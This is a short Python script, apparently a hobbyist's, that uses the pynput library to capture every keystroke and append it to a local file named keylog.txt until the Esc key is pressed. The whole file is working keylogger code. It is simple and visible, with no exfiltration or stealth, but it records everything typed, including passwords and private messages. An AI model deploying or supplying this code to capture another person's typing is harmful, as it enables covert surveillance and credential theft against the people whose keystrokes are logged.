# -*- coding: utf-8 -*-
"""
Created on Wed Jul  3 18:06:17 2024

@author: Hxtreme
"""

from pynput import keyboard

# Define the log file path
log_file = "keylog.txt"

# Function to handle key press events
def on_press(key):
    try:
        # Record the character if it's printable
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            else:
                f.write(f" {key} ")

# Function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when escape key is pressed
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
